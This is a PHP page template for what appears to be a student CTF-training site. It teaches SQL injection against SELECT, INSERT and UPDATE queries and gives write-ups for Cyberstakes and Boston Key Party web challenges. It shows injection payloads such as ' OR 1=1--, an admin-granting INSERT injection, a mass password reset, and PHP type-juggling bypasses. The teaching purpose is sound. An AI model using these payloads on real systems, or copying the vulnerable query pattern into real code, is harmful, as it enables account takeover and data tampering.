<?php
$this->load->view('templates/header');
?>
<h1><?php if($level == "advanced"): ?>Advanced <?php else: ?> Basic <?php endif; ?> Web</h1>
<?php if($level == "advanced"): ?>
<p>Advanced content has not been compiled yet. Want to work on this page? Send me an email at <a class="btn btn-xs btn-success" href="mailto: m171818@usna.edu">m171818 @ usna . edu</a></p>
<?php else: ?>
<ul class="nav nav-pills">
  <li role="presentation" class="active"><a href="#cybstk">Cyberstakes Challenges</a></li>
  <li role="presentation" class="active"><a href="#databases">Databases</a></li>
  <li role="presentation" class="active"><a href="#sql">SQL Injections</a></li>
  <li role="presentation" class="active"><a href="#cybstksoln">Solutions</a></li>
  <li role="presentation" class="active"><a href="http://<?php echo base_url('files/pptx/web.pptx'); ?>">Cyberstakes&copy; Educate the Educator Web pptx</a></li>
</ul>
<h2 id="cybstk">Cyberstakes 2014 Challenges</h2>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#clientside">
  Client Side Authentication
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#php1">
  PHP1
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#php2">
  PHP2
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#php3">
  PHP3
</button>
<h2 id="cybstk">More PHP</h2>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#bkplev2">
  Symphony
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#bkplev6">
  Brigham Circle
</button>
<h2 id="databases">Databases</h2>

<h3>Structure</h3>
<pre>
                                                               +---------+
                                                               | db_name |
                                                               +---------+
                                                                    |
                              +--------------+--------------+--------------+--------------+--------------+
                              |     table    |     table    |     table    |     table    |     table    |
                              +--------------+--------------+--------------+--------------+--------------+
                                     |              |              |              |              |  
                        _____________|      ________|              |              |_______       |____________        
                        |                   |                      |                      |                   |          
               +--------+  +----+  +--------+  +----+     +--------+  +----+     +--------+  +----+  +--------+  +----+
               |columns |->|rows|  |columns |->|rows|     |columns |->|rows|     |columns |->|rows|  |columns |->|rows|
               +--------+  +----+  +--------+  +----+     +--------+  +----+     +--------+  +----+  +--------+  +----+
</pre>
<h2 id="sql">SQL Injection</h2>
<ul class="nav nav-pills">
  <li role="presentation" class="active"><a href="#intro">Intro to SQL Injections</a></li>
  <li role="presentation" class="active"><a href="#select">SELECT</a></li>
  <li role="presentation" class="active"><a href="#insert">INSERT</a></li>
  <li role="presentation" class="active"><a href="#update">UPDATE</a></li>
  <li role="presentation" class="active"><a href="#delete">DELETE</a></li>
</ul>
<h3 id="intro">Intro to SQL Injection</h3>
<p>One of the most popular flaws in Authentication systems today is the SQL injection. Basically the SQL injection is a flaw by the page developer. A developer using a PHP statement like the one below:</p>
<pre><code class="language-php">$query = "</code><code class="language-sql">SELECT * FROM users WHERE username='</code><code class="language-php">$_POST['user']</code>'<code class="language-sql"> AND password = </code>'<code class="language-php">$_POST['pass']'</code><code class="language-php">";</code></pre>
<p>The problem with this may not be clear but lets say I input a username of marcus and a password of secret. The contents of that variable <kbd>$query</kbd> is then as follows:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username='marcus' AND password='secret'</code></pre>
Expected Output:
<pre>
+------------+------------+------------+------------+
|  username  |  password  |    u_id    |    admin   |
+------------+------------+------------+------------+
|   marcus   |   secret   |     231    |    false   |
+------------+------------+------------+------------+
</pre>
Once again, this functions as expected. Lets say this happens however.
<pre><code class="language-sql">SELECT * FROM users WHERE username='admin'--'' AND password='secret'</code></pre>
Expected Output:
<pre>
+------------+------------+------------+------------+
|  username  |  password  |    u_id    |    admin   |
+------------+------------+------------+------------+
|   admin    | adminpass  |     1      |    true    |
+------------+------------+------------+------------+
</pre>
<p>The comment <kbd>--</kbd> is executed and so all database information that has a column named username with a value of admin is returned. What about selecting all of the user information, that can be arranged as such.</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username='' OR 1=1--'' AND password='secret'</code></pre>
Expected Output:
<pre>
+------------+------------+------------+------------+
|  username  |  password  |    u_id    |    admin   |
+------------+------------+------------+------------+
|   marcus   |   secret   |     231    |    false   |
+------------+------------+------------+------------+
|   admin    | adminpass  |     1      |    true    |
+------------+------------+------------+------------+
|    n...    |    n...    |    n...    |    n...    |
+------------+------------+------------+------------+
</pre>
<p>The username input above was <kbd>' OR 1=1--</kbd>. As you can see, the general process for crafting an injection is to first close the quotes. Then you can begin typing a command. This is usually one that will render the statement a tool for you to elevate access. In this case, the OR allows either the condition on the left or right to render the entire statement true. <kbd>1=1</kbd> is one condition, <kbd>username=''</kbd> is the other. <kbd>1=1</kbd> will always be true so our statement is always true. Finally we clean up and comment the extra code to prevent Syntax issues, <kbd>--</kbd></p>
<p>Using this basic concept, just about any query can be crafted. Use the operators in SQL listed below and some techniques to carry out an attack. Just an FYI, a 'blind' SQL injection is one where you do not know what the SQL being executed looks like. It is up to you to figure out what to do.

<h3 id="select">SELECT</h3>
<p>SELECT statements do exactly that, select data from a database. The above example was a SELECT. These are commonly used to get user info, retrieve products, etc. Most commonly, this query is exploited through its WHERE clause. In rare scenarios one may exploit an ORDER BY clause</p>

<h3 id="insert">INSERT</h3>
<p>INSERT statements will add a row to a database. They commonly can be attacked through their VALUES feature as illustrated with the following examples:</p>
<pre><code class="language-sql">INSERT INTO users (username, password, ID, is_admin) VALUES ('$_POST[user]', '$_POST[pass]', '$_POST[ID]', false)</code></pre>
<p>A regular run of the above would yield the following query:</p>
<pre><code class="language-sql">INSERT INTO users (username, password, ID, is_admin) VALUES ('marcus', 'secret', 54, false)</code></pre>
Expected Changes:
<pre>
+------------+------------+------------+------------+
|  username  |  password  |    u_id    |    admin   |
+------------+------------+------------+------------+
|   marcus   |   secret   |     231    |    false   |
+------------+------------+------------+------------+
|   admin    | adminpass  |     1      |    true    |
+------------+------------+------------+------------+
|   marcus   |   secret   |     54     |    false   |
+------------+------------+------------+------------+
|    n...    |    n...    |    n...    |    n...    |
+------------+------------+------------+------------+
</pre>
<p>Once again, this may not seem like it it is valuable. Let us say that we inject this as a username instead <kbd>foo', 'bar', 99999, true)--</kbd>, leaving all other value the same.</p>
<pre><code class="language-sql">INSERT INTO users (username, password, ID, is_admin) VALUES ('foo', 'bar', 99999, true)--', 'secret', 54, false)</code></pre>
Expected Changes:
<pre>
+------------+------------+------------+------------+
|  username  |  password  |    u_id    |    admin   |
+------------+------------+------------+------------+
|   marcus   |   secret   |     231    |    false   |
+------------+------------+------------+------------+
|   admin    | adminpass  |     1      |    true    |
+------------+------------+------------+------------+
|   marcus   |   secret   |     54     |    false   |
+------------+------------+------------+------------+
|    foo     |     bar    |    9999    |    true    |
+------------+------------+------------+------------+
|    n...    |    n...    |    n...    |    n...    |
+------------+------------+------------+------------+
</pre>
<p>This now sets the inserted users information, notably the admin column, to true. In the case of a blind injection, you want to determine how many items are being inserted into the DB with the query. You can start with <kbd>foo')-</kbd> and build up from there by one field. You may want to use a 1 or a 2000 test this to prevent type casting issues.</p>
<pre><code class="language-sql">
foo')--
foo', 1)--
foo', 1, 1)--
foo', 1, 1, 1)--
foo', 1, 1, 1, 1)--
so on...
</code></pre>

<h3 id="update">UPDATE</h3>
<p>Update statements take information and select an existing row to insert it into. This essentially replaces the existing data with new data. An example query is below</p>
<pre><code class="language-sql">UPDATE users SET password='newsecret' WHERE username='marcus' AND password='secret'</code></pre>
Expected Changes:
<pre>
+------------+------------+------------+------------+
|  username  |  password  |    u_id    |    admin   |
+------------+------------+------------+------------+
|   marcus   | newsecret  |     231    |    false   |
+------------+------------+------------+------------+
|   admin    | adminpass  |     1      |    true    |
+------------+------------+------------+------------+
|   marcus   | newsecret  |     54     |    false   |
+------------+------------+------------+------------+
|    foo     |     bar    |    9999    |    true    |
+------------+------------+------------+------------+
|    n...    |    n...    |    n...    |    n...    |
+------------+------------+------------+------------+
</pre>
<p>Assuming the new password is inserted via a form this can happen:</p>
<pre><code class="language-sql">UPDATE users SET password='newsecret' WHERE username='admin' OR 1=1--' AND password='secret'</code></pre>
<p>This command will reset every users password to newsecret since the <kbd>OR 1=1</kbd> will always return true</p>
Expected Changes:
<pre>
+------------+------------+------------+------------+
|  username  |  password  |    u_id    |    admin   |
+------------+------------+------------+------------+
|   marcus   | newsecret  |     231    |    false   |
+------------+------------+------------+------------+
|   admin    | newsecret  |     1      |    true    |
+------------+------------+------------+------------+
|   marcus   | newsecret  |     54     |    false   |
+------------+------------+------------+------------+
|    foo     | newsecret  |    9999    |    true    |
+------------+------------+------------+------------+
|    n...    | newsecret  |    n...    |    n...    |
+------------+------------+------------+------------+
</pre>
<h3 id="delete">DELETE</h3>
<p>This statement works very similarly to the UPDATE statement but instead, deletes the selected rows.</p>
More to come soon...



<h2 id="cybstksoln">Cyberstakes 2014 Solutions</h2>
<p>Some solutions have not yet been posted. Try and solve the puzzles above that you have not yet solved. Solutions will be posted soon, check back and verify your answers when these are posted. </p>
<div class="col-md-6"><h3>Client Side Authentication Solution</h3>
<p>Look at the source. <kbd>Ctrl-U</kbd> on Windows. Take a look at the program. What happens? You submit a form with the password, JS takes the value, hashes it via a pretty obfuscated and most likely complex algorithm. Not to worry, there are further issues. Notice what happens when you get the password right. A false password gives you an alert while a correct password redirects you to another page. Go to that page and you got it.</p>
</div>
<div class="col-md-6"><h3>PHP 1 Solution</h3>
<p>This solution has not yet been created. Check back later</p>
</div><div class="clearfix"></div>
<div class="col-md-6"><h3>PHP 2 Solution</h3>
<p>This solution has not yet been created. Check back later</p>
</div>
<div class="col-md-6"><h3>PHP 3 Solution</h3>
<p>Examining te source code yields that a cookie by the name of <kbd>num</kbd> must be created. The cookie provides a value to the PHP function and mathematical calculation. There must be a way that one can bypass these tests? Take a look at the difference between the two sides of the if statement</p>
<pre><code class="language-php">if (!(is_numeric($num5a) && is_numeric($num5b))) {
    echo "That's not even a number!";
  }</code></pre>
  <p>The first if statement unsures that both are numbers. Remember that PHP automatically casts types unlike many other languages. Some things in a particular format will still register as a number, like HEX. The second if statement:</p>
<pre><code class="language-php">else if ($num5b > $num5a) ...</code></pre>
<p>The interesting thing here is that both num5a and num5b will take the COOKIE value and add five. one adding 5 via the + operator the other via the increment operator ++. How can we make this register true, and the next if statement do the same:</p>
<pre><code class="language-php">if (!($num5a > $num5b))</code></pre>
<p>Some quick studying will reveal that in PHP, infinity does not equal itself. Hence, if your cookie is <kbd>num = INF</kbd> you will make it through the first if, but not the second.</p>
<p>To get the key, read over the <a href="http://php.net/manual/en/language.operators.increment.php">PHP Increment</a> documentation. You will notice an anomaly in the increment operator that increments the hex value <kbd>9D9</kbd> to <kbd>9e0</kbd>. That may look familiar as a mathematical expression, 9<sub>E</sub>0 or 9<sup>0</sup>. Incrementing further increases the power to <kbd>9E1</kbd> and so on. Plug it in and voila, a key.</p>
</div>

<h2 id="cybstksoln">More PHP Write-ups</h2>

<div class="col-md-6"><h3>Boston Key Party - Symphony Solution</h3>
  <p>As with many other web challenges, this one begins with a web page to exploit. The challenge description goes as follows <kbd>A less than four characters number, bigger than 999? Maybe the bug is elsewhere</kbd>. Indeed, the bug is elsewhere. The webpage displays a simple input box. By examining the given source file one would find that the value sent via the input is directly compared to the number 999. 
    <pre><code class="language-php">$number = $_POST['number']
if(strlen($number) < 4) {
  if($number > 999){
    echo "flag{" . $flag . "}";
  }
}</code></pre>
  It is verified that the input <kbd>strlen</kbd> is <kbd>< 4</kbd>. This presents a small problem, one that can be averted with the nuances of PHP. In typical notation there is only one type of number that can be larger than 1000 without having four digits - scientific notation shorthand or 1<sub>E</sub><sup>3</sup>. Fortunately, PHP allows this format to be interpreted as an integer. Moreover, PHP automatically does typecasting. It follows that PHP would parse 1<sub>E</sub><sup>3</sup> as an integer of value 1000. Plug this into the input and there is our key.</p></div>

<div class="col-md-6"><h3>Boston Key Party - Brigham Circle Solution</h3>
    Description: <kbd>Sanitization is hard, lets use regexp!</kbd>
    The important part of the source:
    <pre><code class="language-php">if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
    echo '<p class="alert">You password must be alphanumeric</p>';
else if (strpos ($_GET['password'], '--') !== FALSE)
    echo "flag{" . $flag . "}";</code></pre>
  The problem here begins with the <kbd>ereg()</kbd>. By the way, if errors were enables on this server than you would see very clearly the issues here. The first is that this function is deprecated. The comparison if the first if a strict comparison - <kbd>===</kbd> vice the typical <kbd>==</kbd>. This checks for type as well as value. The interesting thing is how <kbd>ereg()</kbd> handles odd inputs - namely an array! An array is not really compatible with <kbd>ereg()</kbd> so <kbd>NULL</kbd> is returned. In PHP, <kbd>NULL</kbd> is nor strictly false. This gets us past the first test. The second test is very similar. It too is not compatible with arrays and will return <kbd>NULL</kbd>. NULL is strictly unequal to false. There we have it, two passed tests and one array. The solution would be to change the url passed value of <br>
  <code>index.php?password=whatever</code>
  to an array value by adding brackets like this <br>
  <code>index.php?password[]=whatever</code>
<?php endif; ?>
<?php
$this->load->view('modals');
$this->load->view('templates/footer');
?>